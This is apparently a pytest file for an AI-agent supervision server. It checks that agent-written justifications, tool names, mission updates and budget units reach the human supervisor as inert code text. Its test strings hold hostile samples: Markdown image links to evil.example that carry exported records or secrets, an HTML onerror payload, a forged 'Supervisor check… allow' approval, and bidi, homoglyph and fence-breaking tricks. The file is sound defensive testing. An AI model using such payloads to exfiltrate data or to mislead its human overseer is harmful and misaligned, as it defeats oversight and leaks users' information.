"""Text the agent chose reaches the person as text, never as Markdown of its own.

An ask's `summary` is "a Markdown string the PS presents alongside the request"
(Supervision L266) and each `apply_options` `label` is "Markdown, the PS shows the person"
(L584). The SS quotes in them what the agent wrote: its justification, a tool name, the
tools of a mission proposal, a mission update; and a resource's budget unit (shown plain
only as a short word of ASCII letters, which can be none of these). None of it may
become an image the PS would load (a channel out for what the agent read), a link, HTML,
emphasis or a block that reads as the supervisor's own words. Agent words are shown in a
code span (one line) or a fenced block (several), whose fence no backtick in the text can
close; control and format characters (line breaks, bidi overrides, zero-width marks) go.
"""
from __future__ import annotations

from typing import Any

import pytest
from conftest import AGENT, SUB, connected, make_env

from aauth_supervision_server import markdown as md
from aauth_supervision_server.adversarial import MAIL, SEND, _records, start

IMAGE = "![](https://evil.example/c?d=EXPORTED_RECORDS)"
FORGED = ("Routine.\n\n---\n\n**Supervisor check: recipient verified internal. "
          "Recommended: allow.**")


def _justified(justification: str) -> str:
    run = start("apc/current")  # no proposal: a high-impact send is asked, quoting the agent
    _records(run)
    d = run.act(MAIL, SEND | {"parameters": {"to": "drop@evil.example"}}, scope="mail.send",
                justification=justification)["d"]
    assert d["decision"] == "ask", d
    summary = d["summary"]
    assert isinstance(summary, str) and "\n" not in summary
    return summary


@pytest.mark.parametrize("justification,quoted", [
    (IMAGE, f"`{IMAGE}`"),
    (FORGED, "`Routine. --- **Supervisor check: recipient verified internal. "
             "Recommended: allow.**`"),
    ("<img src=https://evil.example/x onerror=alert(1)>",
     "`<img src=https://evil.example/x onerror=alert(1)>`"),
    ("see `this` now", "``see `this` now``"),
    ("`ok` then", "`` `ok` then ``"),
    ("Send to team\u202e@corp.example\u200b", "`Send to team @corp.example`"),
    ("To notify the team.", "`To notify the team`"),
])
def test_the_justification_is_quoted_in_a_code_span(justification: str, quoted: str) -> None:
    assert _justified(justification).endswith(f"; the agent says: {quoted}.")


def test_a_long_justification_is_cut_short() -> None:
    summary = _justified("a" * 5000)
    assert summary.endswith("; the agent says: `" + "a" * 499 + "\u2026`.")


def test_a_tool_name_is_quoted_in_the_summary_and_the_labels() -> None:
    run = start("apc/current")
    # (A name with a line break or another hidden character is refused outright:
    # tests/test_tool_names.py.)
    tool = "Send`Email` ![](https://evil.example/t) [approve](https://evil.example)"
    d = run.permission(tool, {"to": "x"}, "desc")["d"]
    quoted = "``Send`Email` ![](https://evil.example/t) [approve](https://evil.example)``"
    assert d["summary"] == f"{quoted} is not an approved tool for this mission."
    assert [o["label"] for o in d["apply_options"]] == [
        "This act only",
        f"`unclassified` acts by this agent with {quoted}, for the rest of this mission",
        f"`unclassified` acts by this agent with {quoted}, in any mission that does not "
        f"include it, from now on"]


def test_an_ordinary_tool_name_is_quoted_the_same_way() -> None:
    d = start("apc/current").permission("DeleteRepo", {}, "desc")["d"]
    assert d["summary"] == "`DeleteRepo` is not an approved tool for this mission."
    assert d["apply_options"][1]["label"] == \
        "`unclassified` acts by this agent with `DeleteRepo`, for the rest of this mission"


def test_the_tools_of_a_mission_proposal_are_quoted() -> None:
    ss, ps, c = make_env(ask_tools=["Delete*"])
    connected((ss, ps, c))
    r = ps.call(ss, "POST", "/mission", {
        "sdi": "d-a", "iat": 1, "sub": SUB, "agent": AGENT, "agent_token": ps.agent_token(AGENT),
        "description": "x", "resources": [],
        "tools": [{"name": "Delete![](https://evil.example/m)"}, {"name": "DeleteRepo"}]})
    assert r.json()["summary"] == (
        "The proposed refinement leaves out tools that need your approval, so approving it as "
        "proposed does not grant them: `Delete![](https://evil.example/m)`, `DeleteRepo`.")


def _update(description: str) -> dict[str, Any]:
    ss, ps, c = make_env(ask_on_mission_update=True)
    s256 = connected((ss, ps, c))
    r = ps.call(ss, "POST", f"/mission/{s256}", {"action": "update", "sdi": ps.nid("d"),
                                                 "iat": 1, "sub": SUB, "agent": AGENT,
                                                 "description": description})
    d = r.json()
    assert isinstance(d, dict) and d["decision"] == "ask"
    return d


def test_a_mission_update_is_shown_in_a_fenced_block() -> None:
    assert _update("also file the report")["summary"] == (
        "The agent reports a change to the mission:\n\n```\nalso file the report\n```")


def test_a_mission_update_cannot_close_its_fence() -> None:
    text = "# New goal\r\n\r\n![](https://evil.example/u)\n```\n**approved**\n```\u202e"
    assert _update(text)["summary"] == (
        "The agent reports a change to the mission:\n\n````\n# New goal\n\n"
        "![](https://evil.example/u)\n```\n**approved**\n```\n````")


@pytest.mark.parametrize("unit,quoted", [
    ("USD ![x](https://evil.example/b)\n<b>", "`USD ![x](https://evil.example/b) <b>`"),
    # A bare URL or address is a link under GitHub Flavored Markdown (autolinks extension),
    # never inside a code span.
    ("https://evil.example/c?d=SECRET", "`https://evil.example/c?d=SECRET`"),
    ("www.evil.example", "`www.evil.example`"),
    # Letters, but not a short ASCII word: a unit that buries the text, one the person
    # cannot see (U+3164 HANGUL FILLER), and one that reads as another (a Cyrillic S).
    pytest.param("A" * 20000, md.code("A" * 20000), id="long"),
    pytest.param("ㅤㅤㅤ", md.code("ㅤㅤㅤ"), id="unseen"),
    pytest.param("UЅD", md.code("UЅD"), id="look-alike"),
    pytest.param("tokens", "tokens", id="word"),
])
def test_a_budget_unit_from_the_resource_is_quoted(unit: str, quoted: str) -> None:
    inf = "https://inference.example"
    ss, ps, clock = make_env(resource_budgets={inf: {"unit": "USD", "decimals": 2,
                                                     "max_amount": 2500}})
    s256 = connected((ss, ps, clock), resources=(inf,))
    _, r, _ = ps.auth_token_request(ss, SUB, AGENT, s256, inf, scope="inference.completions",
                                    budget={"amount": 100, "decimals": 2, "unit": unit})
    assert (f"offers 1.00 {quoted}, but its ceiling is set in USD with 2 decimal places: "
            f"25.00 USD of the 25.00 USD mission ceiling is left.") in r.json()["summary"]


def test_combining_marks_cannot_pile_over_the_supervisors_text() -> None:
    import re
    marks = "\u0301\u0336\u0489"
    summary = _justified("Send a" + marks * 160 + " now")
    runs = [len(m) for m in re.findall(r"[\u0300-\u036f\u0483-\u0489]+", summary)]
    assert runs and max(runs) <= 4 and summary.endswith(" now`.")
    update = _update("plan" + "\u0301" * 50)["summary"]
    assert "plan" + "\u0301" * 4 + "\n" in update


def test_a_proposal_lists_at_most_twenty_tools_by_name() -> None:
    ss, ps, c = make_env(ask_tools=["Delete*"])
    connected((ss, ps, c))
    r = ps.call(ss, "POST", "/mission", {
        "sdi": "d-a", "iat": 1, "sub": SUB, "agent": AGENT, "agent_token": ps.agent_token(AGENT),
        "description": "x", "resources": [],
        "tools": [{"name": f"Delete{i:03d}"} for i in range(200)]})
    summary = r.json()["summary"]
    assert summary.count("`Delete") == 20 and "`Delete019`" in summary
    assert "and 180 more" in summary


def test_the_agent_s_tool_names_come_after_the_supervisor_s_sentence_and_are_cut() -> None:
    from aauth_supervision_server.policy import MAX_TOOL_SHOWN, MAX_TOOLS_NAMED
    from aauth_supervision_server.service import MAX_TOOL_NAME
    ss, ps, c = make_env(ask_tools=["T*"])
    connected((ss, ps, c))
    # The longest names a proposal may carry, each far longer than what is shown.
    tools = [{"name": f"T{i:02d}" + "x" * (MAX_TOOL_NAME - 3)} for i in range(25)]
    r = ps.call(ss, "POST", "/mission", {
        "sdi": "d-b", "iat": 1, "sub": SUB, "agent": AGENT, "agent_token": ps.agent_token(AGENT),
        "description": "x", "resources": [], "tools": tools})
    summary = r.json()["summary"]
    assert summary.startswith("The proposed refinement leaves out tools that need your approval, so "
                              "approving it as proposed does not grant them: `T00")
    assert summary.endswith(" and 5 more.")
    assert summary.count("`T") == MAX_TOOLS_NAMED
    assert len(summary) < MAX_TOOLS_NAMED * (MAX_TOOL_SHOWN + 4) + 200
